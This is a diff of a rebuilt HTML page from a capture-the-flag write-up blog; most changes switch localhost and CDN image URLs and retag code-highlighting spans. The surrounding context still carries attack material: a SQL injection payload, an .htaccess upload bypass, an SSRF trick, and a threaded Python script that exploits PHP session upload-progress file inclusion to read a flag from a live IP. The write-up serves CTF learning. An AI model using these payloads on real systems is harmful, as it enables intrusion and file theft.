@@ -4,7 +4,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>2021↑ WP汇总 - Theoyu</title>
 
 <meta name="description" content="">
-<link rel="canonical" href="http://localhost:4000/2021/2021"><link rel="alternate" type="application/rss+xml" title="Theoyu" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
+<link rel="canonical" href="https://theoyu.top/2021/2021"><link rel="alternate" type="application/rss+xml" title="Theoyu" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
 
 <meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
 
@@ -792,7 +792,7 @@ z
 </code></pre></div></div>
 <p>其中<code class="language-plaintext highlighter-rouge">ZipArchive::open</code>,如果指定参数为<code class="language-plaintext highlighter-rouge">ZIPARCHIVE::OVERWRITE</code>,则会对源文件进行重覆盖，</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520000222964.png" alt="image-20210520000222964" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520000222964.png" alt="image-20210520000222964" /></p>
 
 <p>同时我们关注红框里的一句话，如果文件为空则无效，我们就可以利用这个删除<code class="language-plaintext highlighter-rouge">waf.txt</code>。</p>
 
@@ -1123,22 +1123,22 @@ z
 <span class="c1">// Load configuration</span>
 <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
 <span class="nv">$a</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">];</span>
-<span class="nb">unset</span><span class="p">(</span><span class="nv">$f3</span><span class="o">-&gt;</span><span class="nv">$a</span><span class="p">);</span>
+<span class="k">unset</span><span class="p">(</span><span class="nv">$f3</span><span class="o">-&gt;</span><span class="nv">$a</span><span class="p">);</span>
 
 <span class="nv">$f3</span><span class="o">-&gt;</span><span class="nf">run</span><span class="p">();</span> 
 </code></pre></div></div>
 <p>运行发现<code class="language-plaintext highlighter-rouge">base.php</code>中的一个<code class="language-plaintext highlighter-rouge">eval()</code>函数有报错，我们跟进看一下。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-30-1877951853.png" alt="" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-30-1877951853.png" alt="" /></p>
 
 <p>函数调用应该是这里，我们在在前面加上一个<code class="language-plaintext highlighter-rouge">var_dump('unset('.$val.');');</code>,用于调试。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-30-3769891392.png" alt="" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-30-3769891392.png" alt="" /></p>
 
 <p>有了输出就好说，看能不能把括号闭合一下。
 测试发现要关闭<code class="language-plaintext highlighter-rouge">)</code>,得先关闭<code class="language-plaintext highlighter-rouge">]</code></p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-30-3079279328.png" alt="" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-30-3079279328.png" alt="" /></p>
 
 <p>后面就是命令执行拿flag了。</p>
 
@@ -1286,11 +1286,11 @@ z
 
 <p>但本地测试的适合一直没有发生302跳转：</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-11-image-20210511223815266.png" alt="image-20210511223815266" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-11-image-20210511223815266.png" alt="image-20210511223815266" /></p>
 
 <p>带上<code class="language-plaintext highlighter-rouge">//</code>后成功了，才想起来<code class="language-plaintext highlighter-rouge">//</code>就是省略HTTP协议的写法。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-11-image-20210511223837295.png" alt="image-20210511223837295" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-11-image-20210511223837295.png" alt="image-20210511223837295" /></p>
 
 <p>再回到题目，我们直接可以通过这个特性访问内网80端口，传参readfile，但不知道为什么一直读不到flag…</p>
 
@@ -1303,11 +1303,11 @@ z
 
 <p>然后直接<code class="language-plaintext highlighter-rouge">{"url"="https://127.0.0.1:1234//ip/.."}</code></p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-11-image-20210511224859453.png" alt="image-20210511224859453" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-11-image-20210511224859453.png" alt="image-20210511224859453" /></p>
 
 <p>后来看师傅们的wp，打本地也是ok的，不过不知道为什么不能直接读<code class="language-plaintext highlighter-rouge">/flag</code>,还得从传参一层一层读..</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-11-image-20210511225539813.png" alt="image-20210511225539813" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-11-image-20210511225539813.png" alt="image-20210511225539813" /></p>
 
 <h3 id="uploadhub-">UploadHub ×</h3>
 
@@ -1334,7 +1334,7 @@ php_flag engine on
 
 <p>我记得我之前用过这种类似的，但是不行，试了一次果然还是不行…奇奇怪怪</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-11-image-20210511233114244.png" alt="image-20210511233114244" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-11-image-20210511233114244.png" alt="image-20210511233114244" /></p>
 
 <p><strong>后续补充</strong>:在buu上重新做了一下这道题，原封不动的打法成功了,但是马很快会被删掉，而且<code class="language-plaintext highlighter-rouge">disable_funciton</code>禁用很多，不过直接用<code class="language-plaintext highlighter-rouge">file_get_contens()</code>读 <strong>/flag</strong>即可。</p>
 
@@ -1365,7 +1365,7 @@ passwd=1&amp;uname=') and extractvalue(0x0a,concat(0x0a,(select * from (select *
 
 <p><strong>后续补充</strong>：在看博客的时候，发现羽师傅用的就是<code class="language-plaintext highlighter-rouge">splFileObject</code>的方法，手册里面写有：</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-18-image-20210518202515518.png" alt="image-20210518202515518" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-18-image-20210518202515518.png" alt="image-20210518202515518" /></p>
 
 <p>再调用<code class="language-plaintext highlighter-rouge">fpassthru</code>就可以输出全部文件内容，送自己一句：<strong>Read The Fucking Manual</strong>！</p>
 
@@ -1377,36 +1377,36 @@ passwd=1&amp;uname=') and extractvalue(0x0a,concat(0x0a,(select * from (select *
 
 <p><code class="language-plaintext highlighter-rouge">disable_function</code>禁用了很多函数，用蓝帽杯那题的思路就行(多做题还是好XD)</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">io</span>
-<span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">threading</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">io</span>
+<span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">threading</span>
 <span class="n">sessid</span> <span class="o">=</span> <span class="s">'Theoyu'</span>
 <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"cf"</span><span class="p">:</span><span class="s">'../../../../var/lib/php/sessions/gcbejhehdh/sess_'</span><span class="o">+</span><span class="n">sessid</span><span class="p">}</span>
 
 <span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
     <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-        <span class="n">f</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="sa">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
+        <span class="n">f</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="nc">BytesIO</span><span class="p">(</span><span class="sa">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
         <span class="c1"># resp = session.post( 'http://124.70.28.149:20877/', data={'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php $a = new DirectoryIterator("glob:///etc/aebgjbecbg/abhiabddfd/hafjgahhef/debibfeahf/bibciiadie/fl444444g/*");foreach($a as $f){echo($f-&gt;__toString()."\n");}?&gt;'}, files={'file': ('test.txt',f)}, cookies={'PHPSESSID': sessid} )
-</span>        <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span> <span class="s">'http://124.70.28.149:20877/'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="p">:</span> <span class="s">'&lt;?php  var_dump(file_get_contents("/etc/aebgjbecbg/abhiabddfd/hafjgahhef/debibfeahf/bibciiadie/fl444444g")); ?&gt;'</span><span class="p">},</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s">'file'</span><span class="p">:</span> <span class="p">(</span><span class="s">'test.txt'</span><span class="p">,</span><span class="n">f</span><span class="p">)},</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s">'PHPSESSID'</span><span class="p">:</span> <span class="n">sessid</span><span class="p">}</span> <span class="p">)</span>
+</span>        <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span> <span class="s">'http://124.70.28.149:20877/'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="p">:</span> <span class="s">'&lt;?php  var_dump(file_get_contents("/etc/aebgjbecbg/abhiabddfd/hafjgahhef/debibfeahf/bibciiadie/fl444444g")); ?&gt;'</span><span class="p">},</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s">'file'</span><span class="p">:</span> <span class="p">(</span><span class="s">'test.txt'</span><span class="p">,</span><span class="n">f</span><span class="p">)},</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s">'PHPSESSID'</span><span class="p">:</span> <span class="n">sessid</span><span class="p">}</span> <span class="p">)</span>
 <span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>  
-    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'http://124.70.28.149:20877/'</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="s">'http://124.70.28.149:20877/'</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
     <span class="c1">#print(resp.text)
 </span>    <span class="k">if</span> <span class="s">'test.txt'</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
-        <span class="n">event</span><span class="p">.</span><span class="n">clear</span><span class="p">()</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="n">event</span><span class="p">.</span><span class="nf">clear</span><span class="p">()</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">"[+++++++++++++]retry"</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="s">"[+++++++++++++]retry"</span><span class="p">)</span>
 <span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
-    <span class="n">event</span><span class="o">=</span><span class="n">threading</span><span class="p">.</span><span class="n">Event</span><span class="p">()</span>
-    <span class="k">with</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
-        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">30</span><span class="p">):</span> 
-            <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">write</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,)).</span><span class="n">start</span><span class="p">()</span>
-        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">30</span><span class="p">):</span>
-            <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">read</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,)).</span><span class="n">start</span><span class="p">()</span>
-    <span class="n">event</span><span class="p">.</span><span class="nb">set</span><span class="p">()</span>
+    <span class="n">event</span><span class="o">=</span><span class="n">threading</span><span class="p">.</span><span class="nc">Event</span><span class="p">()</span>
+    <span class="k">with</span> <span class="n">requests</span><span class="p">.</span><span class="nf">session</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">30</span><span class="p">):</span> 
+            <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">write</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,)).</span><span class="nf">start</span><span class="p">()</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">30</span><span class="p">):</span>
+            <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">read</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,)).</span><span class="nf">start</span><span class="p">()</span>
+    <span class="n">event</span><span class="p">.</span><span class="nf">set</span><span class="p">()</span>
 </code></pre></div></div>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-15-image-20210515213117458.png" alt="image-20210515213117458" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-15-image-20210515213117458.png" alt="image-20210515213117458" /></p>
 
 <h3 id="upload-">upload ×</h3>
 
@@ -1519,7 +1519,7 @@ passwd=1&amp;uname=') and extractvalue(0x0a,concat(0x0a,(select * from (select *
 
 <p>这里我们随意创建一个zip文件，抓包尝试：</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-19-image-20210519160130742.png" alt="image-20210519160130742" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-19-image-20210519160130742.png" alt="image-20210519160130742" /></p>
 
 <p>可以看到是成功绕过,那现在重新回归一下思路</p>
 
@@ -1546,13 +1546,13 @@ passwd=1&amp;uname=') and extractvalue(0x0a,concat(0x0a,(select * from (select *
 
 <p>payload使用的Huffman编码,在这个<a href="https://gchq.github.io/">网址</a>可以直接进行编码解码，修改我们的payload。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-19-image-20210519171632231.png" alt="image-20210519171632231" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-19-image-20210519171632231.png" alt="image-20210519171632231" /></p>
 
 <p>运行即可得到图片马,后续按如期操作即可。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-19-image-20210519172210942.png" alt="image-20210519172210942" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-19-image-20210519172210942.png" alt="image-20210519172210942" /></p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-19-image-20210519173821329.png" alt="image-20210519173821329" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-19-image-20210519173821329.png" alt="image-20210519173821329" /></p>
 
 <p>还有一道类似Laravel Debug mode RCE（CVE-2021-3129）的题目,可惜自己对框架这一块一直没怎么注重,今天开始代码审计计划，给自己也挖一个坑,一周至少两个cms,一个月后去接触框架漏洞。</p>
 </div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2021-05-17T00:00:00+08:00"><!-- start custom article footer snippet -->
@@ -1601,7 +1601,7 @@ passwd=1&amp;uname=') and extractvalue(0x0a,concat(0x0a,(select * from (select *
   *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
   *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
   var disqus_config = function () {
-    this.page.url = 'http://localhost:4000/2021/2021';
+    this.page.url = 'https://theoyu.top/2021/2021';
     this.page.identifier = '2021↑ WP汇总';
   };
   (function() { // DON'T EDIT BELOW THIS LINE
